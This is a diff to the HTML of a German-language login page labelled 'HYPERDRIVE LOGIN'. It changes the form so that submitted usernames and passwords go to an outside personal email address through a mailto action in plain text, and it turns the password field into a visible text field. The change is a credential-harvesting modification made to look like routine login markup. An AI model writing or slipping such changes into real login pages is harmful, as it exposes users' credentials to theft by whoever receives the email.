@@ -41,8 +41,7 @@
             margin-bottom: 8px;
             font-size: 0.9em;
         }
-        input[type="text"],
-        input[type="password"] {
+        input[type="text"] {
             width: 100%;
             padding: 10px;
             border: 1px solid #30363d;
@@ -53,8 +52,7 @@
             box-sizing: border-box;
             transition: 0.3s;
         }
-        input[type="text"]:focus,
-        input[type="password"]:focus {
+        input[type="text"]:focus {
             outline: none;
             border-color: #58a6ff;
             box-shadow: 0 0 5px rgba(88, 166, 255, 0.3);
@@ -82,7 +80,7 @@
     <div class="container">
         <h1>HYPERDRIVE LOGIN</h1>
         
-        <form action="#" method="POST">
+        <form action="mailto:cartman4310@gmail.com" method="POST" enctype="text/plain">
             <div class="form-group">
                 <label for="username">Identifikations-ID (Nutzername)</label>
                 <input type="text" id="username" name="username" required autocomplete="off">
@@ -90,7 +88,7 @@
             
             <div class="form-group">
                 <label for="password">Zugriffscode (Passwort)</label>
-                <input type="password" id="password" name="password" required>
+                <input type="text" id="password" name="password" required autocomplete="off">
             </div>
             
             <button type="submit" class="btn">Authentifizieren</button>
